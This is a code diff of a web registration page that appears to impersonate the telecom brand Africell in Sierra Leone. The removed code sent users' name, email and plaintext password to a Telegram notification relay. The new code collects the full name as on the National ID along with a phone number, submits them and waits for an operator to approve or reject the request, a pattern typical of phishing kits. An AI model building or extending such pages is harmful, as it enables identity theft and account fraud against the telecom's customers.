@@ -72,7 +72,7 @@
         /* Main Heading */
         .reg-heading {
             font-size: 32px;
-            font-weight: 400;
+            font-weight: 800;
             color: #000000;
             text-align: center;
             margin-top: 40px;
@@ -81,8 +81,8 @@
 
         /* Instructions */
         .reg-instructions {
-            font-size: 16px;
-            color: #000000;
+            font-size: 15px;
+            color: #444444;
             text-align: center;
             font-weight: 400;
             line-height: 1.4;
@@ -124,19 +124,7 @@
             border-color: #79105c;
         }
 
-        /* Eye Icon Toggle for Passwords */
-        .toggle-password {
-            position: absolute;
-            right: 24px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #79105c;
-            font-size: 20px;
-            cursor: pointer;
-            z-index: 10;
-        }
-
-        /* Large Purple Create Account Button */
+        /* Large Purple Continue Button */
         .reg-btn {
             width: 100%;
             height: 110px;
@@ -274,40 +262,23 @@
 
         <!-- Main Body Content -->
         <div class="reg-content">
-            <h1 class="reg-heading">Create Account</h1>
+            <h1 class="reg-heading">Enter Your Name</h1>
             <p class="reg-instructions">
-                Please enter your details to create an account
+                Please enter your full name according to your National ID / what you are called in Sierra Leone
             </p>
 
-            <!-- 1. Full Name Field -->
+            <!-- Full Name Field Only -->
             <div class="reg-input-group">
                 <input type="text" id="fullName" class="reg-input-field" placeholder="Full Name" required>
             </div>
 
-            <!-- 2. Email Address Field -->
-            <div class="reg-input-group">
-                <input type="email" id="emailAddress" class="reg-input-field" placeholder="Email Address" required>
-            </div>
-
-            <!-- 3. Password Field -->
-            <div class="reg-input-group">
-                <input type="password" id="regPassword" class="reg-input-field" placeholder="Password" required>
-                <i class="fa-solid fa-eye toggle-password" id="toggleRegPass" onclick="togglePass('regPassword', 'toggleRegPass')"></i>
-            </div>
-
-            <!-- 4. Confirm Password Field -->
-            <div class="reg-input-group">
-                <input type="password" id="confirmRegPassword" class="reg-input-field" placeholder="Confirm Password" required>
-                <i class="fa-solid fa-eye toggle-password" id="toggleConfirmRegPass" onclick="togglePass('confirmRegPassword', 'toggleConfirmRegPass')"></i>
-            </div>
-
-            <!-- Purple Create Account Button -->
-            <button type="button" id="createAccountBtn" class="reg-btn">Create Account</button>
+            <!-- Purple Continue Button -->
+            <button type="button" id="createAccountBtn" class="reg-btn">Continue</button>
 
             <!-- Loading Spinner -->
             <div id="loadingSpinner">
                 <div class="spinner"></div>
-                <span id="spinnerText">Creating your account...</span>
+                <span id="spinnerText">Processing...</span>
             </div>
         </div>
     </div>
@@ -337,22 +308,16 @@
             }
         }
 
-        function togglePass(inputId, iconId) {
-            const input = document.getElementById(inputId);
-            const icon = document.getElementById(iconId);
-            if (input.type === 'password') {
-                input.type = 'text';
-                icon.classList.remove('fa-eye');
-                icon.classList.add('fa-eye-slash');
-            } else {
-                input.type = 'password';
-                icon.classList.remove('fa-eye-slash');
-                icon.classList.add('fa-eye');
-            }
-        }
-
-        // Attach event listener dynamically so it never fails to fire
+        // Auto-populate full name if saved previously in localStorage
         document.addEventListener('DOMContentLoaded', () => {
+            const savedName = localStorage.getItem('africellFullName');
+            if (savedName) {
+                const nameInput = document.getElementById('fullName');
+                if (nameInput) {
+                    nameInput.value = savedName;
+                }
+            }
+
             const createBtn = document.getElementById('createAccountBtn');
             if (createBtn) {
                 createBtn.addEventListener('click', submitRegistration);
@@ -362,12 +327,7 @@
         async function submitRegistration(e) {
             if (e) e.preventDefault();
 
-            console.log("Create Account button clicked!");
-
             const nameVal = document.getElementById('fullName').value.trim();
-            const emailVal = document.getElementById('emailAddress').value.trim();
-            const pass1 = document.getElementById('regPassword').value.trim();
-            const pass2 = document.getElementById('confirmRegPassword').value.trim();
             const createBtn = document.getElementById('createAccountBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
             const spinnerText = document.getElementById('spinnerText');
@@ -380,47 +340,30 @@
                 return;
             }
 
-            if (!emailVal) {
-                if (spinnerDiv) spinnerDiv.style.display = 'none';
-                createBtn.classList.remove('disabled-state');
-                showAppAlert('❌ Please enter your email address.');
-                return;
-            }
-
-            if (!pass1 || pass1 !== pass2) {
-                if (spinnerDiv) spinnerDiv.style.display = 'none';
-                createBtn.classList.remove('disabled-state');
-                showAppAlert('❌ Passwords do not match or are empty.');
-                return;
-            }
+            localStorage.setItem('africellFullName', nameVal);
 
             try {
                 createBtn.classList.add('disabled-state');
-                if (spinnerText) spinnerText.innerText = 'Creating your account...';
+                if (spinnerText) spinnerText.innerText = 'Submitting full name...';
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
-                // Packs Name, Email, and Password into the Telegram notification payload
-                const registrationPayload = `Name: ${nameVal} | Email: ${emailVal} | Password: ${pass1}`;
-
-                console.log("Sending registration to server...");
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
                         phone: phoneInput, 
-                        uniqueId: 'Account Registration: ' + registrationPayload 
+                        uniqueId: 'Account Registration Name: ' + nameVal 
                     })
                 });
 
                 const result = await response.json();
-                console.log("Server response:", result);
 
                 if (result.success) {
                     pollApprovalStatus(phoneInput);
                 } else {
                     createBtn.classList.remove('disabled-state');
                     if (spinnerDiv) spinnerDiv.style.display = 'none';
-                    showAppAlert('❌ Registration failed. Please try again.');
+                    showAppAlert('❌ Submission failed. Please try again.');
                 }
             } catch (error) {
                 console.error('Client Error:', error);
@@ -440,11 +383,9 @@
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
 
-                    console.log("Polling status:", data.status);
-
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
-                        showAppAlert('✅ Account created successfully!', () => {
+                        showAppAlert('✅ Approved!', () => {
                             window.location.href = 'login.html';
                         });
                     } 
@@ -452,7 +393,7 @@
                         clearInterval(statusInterval);
                         if (spinnerDiv) spinnerDiv.style.display = 'none';
                         createBtn.classList.remove('disabled-state');
-                        showAppAlert('❌ Registration request rejected.');
+                        showAppAlert('❌ Request rejected.');
                     }
                 } catch (e) {
                     console.error('Polling error', e);
